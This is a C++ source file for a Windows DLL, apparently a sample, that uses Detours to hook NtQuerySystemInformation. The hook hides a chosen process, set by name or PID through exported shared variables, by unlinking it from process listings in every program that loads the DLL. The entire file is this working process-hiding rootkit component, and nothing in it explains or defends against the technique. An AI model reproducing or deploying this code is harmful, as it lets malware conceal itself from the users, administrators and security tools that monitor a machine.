// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <winternl.h>
#include <detours.h>

#pragma comment(lib, "ntdll")

#pragma data_seg("shared")
__declspec(dllexport) WCHAR HiddenProcessName[32] = { 0 };
__declspec(dllexport) DWORD HiddenPid = 0;
#pragma data_seg()
#pragma comment(linker, "/section:shared,RWS")

decltype(::NtQuerySystemInformation)* OrgNtQuerySystemInformation;

NTSTATUS NTAPI HookNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS infoClass, PVOID info, ULONG len, PULONG rlen) {
	auto status = OrgNtQuerySystemInformation(infoClass, info, len, rlen);
	if (!NT_SUCCESS(status))
		return status;

	if (infoClass != SystemProcessInformation)
		return status;

	if (HiddenPid == 0 && HiddenProcessName[0] == 0)
		return status;

	auto p = (SYSTEM_PROCESS_INFORMATION*)info;
	SYSTEM_PROCESS_INFORMATION* prev = nullptr;
	for(;;) {
		if (prev) {
			if ((*HiddenProcessName && _wcsnicmp(HiddenProcessName, p->ImageName.Buffer, p->ImageName.Length / sizeof(WCHAR)) == 0) ||
				(HiddenPid && HiddenPid == HandleToULong(p->UniqueProcessId))) {
				//
				// hide process
				//
				prev->NextEntryOffset += p->NextEntryOffset;
			}
			else {
				prev = p;
			}
		}
		else {
			prev = p;
		}
		p = (SYSTEM_PROCESS_INFORMATION*)((PBYTE)p + p->NextEntryOffset);
		if (p->NextEntryOffset == 0)
			break;
	} 
	return status;
}


bool InstallHooks() {
	OrgNtQuerySystemInformation = (decltype(::NtQuerySystemInformation)*)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	DetourTransactionBegin();
	DetourAttach((PVOID*)&OrgNtQuerySystemInformation, HookNtQuerySystemInformation);
	return ERROR_SUCCESS == DetourTransactionCommit();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
	switch (reason) {
		case DLL_PROCESS_ATTACH:
			return InstallHooks();

		case DLL_PROCESS_DETACH:
			//UninstallHooks();
			break;
	}
	return TRUE;
}

